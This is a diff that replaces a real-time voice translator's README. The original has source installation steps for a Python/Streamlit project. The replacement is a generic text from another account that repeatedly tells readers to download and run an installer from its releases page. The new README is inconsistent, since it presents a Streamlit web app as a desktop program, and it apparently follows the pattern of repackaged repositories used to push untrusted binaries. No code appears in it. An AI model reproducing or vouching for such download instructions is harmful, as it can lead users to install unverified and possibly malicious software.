@@ -1,207 +1,72 @@
-# 🌐 Real-Time Voice Translator
-
-<img width="1536" height="1024" alt="Voice Translator thumbnail" src="https://github.com/user-attachments/assets/7bb6ac4b-12b0-435b-87b3-f4c9fbe27c37" />
-
-**Streamlit version ** — a Python application that captures speech input, translates it to a selected target language, and plays back the translated audio. This web version improves accessibility and user experience while preserving the core functionality: speech recognition → translation → text-to-speech.
-
----
-
-## 🔎 Overview
-
-Real Time Voice Translator listens to microphone input (or accepts uploaded audio), recognizes the spoken text, translates it to a chosen target language, and returns both the translated text and an audio playback of the translated text.
-
-Key goals:
-- Fast, simple user flow for live voice translation
-- Multilingual support for input and output
-- Continuous start/stop control for conversation flows
-
----
-
-## 🧰 Technology Stack
-
-- **Python 3.10+**
-- **Streamlit** – web UI
-- **SpeechRecognition** – microphone audio capture and speech→text
-- **deep-translator** (GoogleTranslator) – text translation
-- **gTTS** – text→speech audio generation
-- **google-transliteration-api** – transliteration support for non-Latin scripts
-- **SQLite** – local storage for recordings / transcripts (optional)
-- **pydub / ffmpeg** – audio format conversion (if needed)
-
----
-
-## ✨ Features
-
-- Select input & output language from a predefined list.
-- Live microphone capture with start/stop controls.
-- Automatic speech recognition (speech → text).
-- Machine translation of recognized text to the chosen target language.
-- Play translated text as audio inside the web app.
-- Show original recognized text and translated text in UI.
-- Edit transcription before saving.
-- Error handling for recognition/translation failures and friendly messages.
-
----
-
-## 📁 Project Structure
-
-/
-├── app_streamlit.py # Streamlit front-end (main web app)
-├── main.py # Original Tkinter app (reference)
-├── requirements.txt # Python dependencies
-├── README.md # This file
-├── REPORT.md # Detailed project report
-├── CONTRIBUTING.md # Contribution guidelines
-├── CHANGELOG.md # Project changelog
-
----
-
-## ▶ Installation
-
-1. **Clone the repo**
-```bash
-git https://github.com/RakeshBabuGajula/real-time-voice-translator
-cd linguasync
-```
-
-2. **Create & activate virtual environment**
-```bash
-python -m venv env
-# Windows
-env\Scripts\activate
-# macOS / Linux
-source env/bin/activate
-```
-
-3. **Install dependencies**
-```bash
-pip install -r requirements.txt
-```
-
-*Note (Windows users):* If pyaudio fails to install, install the appropriate wheel for your Python version or install PortAudio (or use file upload as fallback).
-
-(Optional) If you plan to use local audio conversions, ensure ffmpeg is installed and available in PATH.
-
----
-
-## ▶ Configuration
-
-Create a `.env` file from the example and add any optional keys:
-
-```text
-# .env (create from .env.example)
-# Optional: keys for cloud services if you use them
-GOOGLE_API_KEY=
-WHISPER_MODEL=base
-DATABASE_PATH=corpus.db
-```
-
-The app is designed to work with the speech_recognition library's `recognize_google()` method (which typically works without an API key for small usage). If you prefer a paid/official Google Cloud setup, configure credentials as required.
-
----
-
-## ▶ Running the App
-
-Start Streamlit:
-
-```bash
-streamlit run app_streamlit.py
-```
-
-- Select Input Language and Output Language.
-- Click Start (allow microphone access when prompted by the browser).
-- Speak clearly — the app will show recognized text, translate it, then play back the translated audio.
-- Edit the transcription if needed, then Save to store the record locally.
-
----
-
-
-## ✅ Supported Languages (example)
-
-Input and output languages can include (configurable list in `app_streamlit.py`):
-
-- English (en)
-- Hindi (hi)
-- Bengali (bn)
-- Spanish (es)
-- Chinese (Simplified) (zh-CN)
-- Russian (ru)
-- Japanese (ja)
-- Korean (ko)
-- German (de)
-- French (fr)
-- Tamil (ta)
-- Telugu (te)
-- Kannada (kn)
-- Gujarati (gu)
-- Punjabi (pa)
-
-You can expand this list by editing the languages mapping in the app.
-
----
-
-## ⚠ Known Limitations
-
-- Internet required for speech recognition and Google translation by default.
-- gTTS may not support all languages or voices (some languages may fail).
-- Browser-based audio playback behavior varies by browser and platform.
-- Real-time performance is constrained by network latency and client CPU.
-- For robust offline transcription, consider integrating Whisper (local) as a future improvement.
-
----
-
-## 🛠 Troubleshooting
-
-- Microphone not found / permission denied: ensure the browser has permission to use the microphone; try a different browser.
-- pyaudio install failure (Windows): install the appropriate wheel from PyPI unofficial wheels or use file-upload fallback.
-- No audio playback: check browser audio settings; try playsound fallback or download the MP3 and play externally.
-- Transcription returns empty or garbage: speak clearly, increase input volume, or try a different input language code.
-
----
-
-## 🔮 Future Improvements
-
-- Add more languages & dialect-specific models.
-- Add offline transcription (OpenAI Whisper / Vosk) and offline TTS options.
-- Improve UI/UX with progress indicators and conversation history.
-- Implement user authentication & history tracking for persistent users.
-- Provide a public Hugging Face Space demo for easy sharing (if compatible).
-- Add multi-speaker diarization and punctuation improvements.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome. Please follow these steps:
-
-- Fork the repo and create a feature branch:
-  ```bash
-  git checkout -b feature/your-feature
-  ```
-- Make changes, test thoroughly.
-- Commit and push your branch, then open a Merge Request.
-- Update CHANGELOG.md with notable changes.
-- Please read CONTRIBUTING.md for code style and commit guidelines.
-
----
-
-## 🧾 License
-
-This project is released under the AGPLv3 License — see LICENSE for details.
-
----
-
-## 👥 Authors & Acknowledgements
-
-
-
-
-Original idea and internship: Viswam.ai / Swecha (Summer of AI 2025)
-
-Libraries & models: SpeechRecognition, deep-translator, gTTS, Streamlit
-
----
-
-## 📺 Demo 
-https://youtu.be/WB1wDMpseBg?si=eWcA9bIFdnNJYJWp
-
+# 🎤 real-time-voice-translator - Translate Speech Instantly
+
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20Release-v1.0-blue.svg)](https://github.com/Jopex1/real-time-voice-translator/releases)
+
+## 📋 Overview
+The **real-time voice translator** is a web application that offers instant translation for spoken words. Built using Streamlit, this app captures live speech, converts it to text, and translates it into your selected language. It even plays back the translated audio using text-to-speech.
+
+This tool supports multiple languages, allowing seamless communication. You can start and stop the translation, edit text, and export results to suit your needs.
+
+## 🚀 Getting Started
+To run the application, follow these steps:
+
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Jopex1/real-time-voice-translator/releases) to find the latest version of the application.
+2. **Download the Application**: Click on the version you wish to download. This will prompt you to save the file on your computer.
+3. **Install the Application**: Open the downloaded file and follow the on-screen instructions to install the application.
+
+## 💻 System Requirements
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Processor**: Intel i3 or equivalent.
+- **Memory**: At least 4 GB of RAM.
+- **Internet Connection**: Required for language translation features.
+- **Web Browser**: Latest version of Chrome, Firefox, or Safari recommended.
+
+## 🛠️ Features
+- **Live Speech Capture**: Instantly record and translate spoken words.
+- **Multi-Language Support**: Choose from a variety of languages.
+- **Text Editing**: Edit the translated text as needed.
+- **Audio Playback**: Hear the translated speech through text-to-speech.
+- **Export Options**: Save the translated text or audio file for future use.
+
+## 🔍 How to Use
+1. **Launch the Application**: Open the application from your desktop or start menu.
+2. **Select Language**: Choose from the dropdown menu to select the language you want to translate to.
+3. **Start Recording**: Click the 'Start' button to begin capturing your voice. Speak clearly for best results.
+4. **View Translated Text**: Watch as your speech converts to text and appears in the application.
+5. **Listen to Translation**: Hit the 'Play' button to hear the translated audio.
+6. **Edit and Export**: Make any necessary edits to the text and use the export feature to save your work.
+
+## 📥 Download & Install
+You can download the application from our [Releases page](https://github.com/Jopex1/real-time-voice-translator/releases). This page lists all available versions. Select the most recent release to ensure you have the latest features.
+
+## 🔑 Key Concepts
+- **Speech Recognition**: Understanding spoken language and converting it into text.
+- **Language Translation**: Converting text from one language to another.
+- **Text-to-Speech**: Generating spoken audio from written text.
+
+## 🌐 Supported Languages
+- English
+- Spanish
+- French
+- Chinese
+- German
+- And more...
+
+## ❓ FAQ
+**Q: What if the application does not start?**  
+A: Ensure that your system meets the minimum requirements. If the issue persists, try reinstalling the application.
+
+**Q: Can I change the language during translation?**  
+A: Yes, you can stop the current recording, select a new language, and start again.
+
+**Q: Is there a limit to how long I can speak?**  
+A: While there is no strict limit, longer speech may affect performance. It is best to keep segments under two minutes for optimal results.
+
+## 📞 Support
+If you have questions or need assistance, feel free to open an issue on our GitHub repository. We will do our best to help you.
+
+## 👍 Feedback
+Your comments and suggestions help us improve. Please let us know your experience with the application. Whether it's a feature request or a bug report, we appreciate your input. 
+
+Thank you for using **real-time voice translator**! We hope it makes your communication easier and more effective.
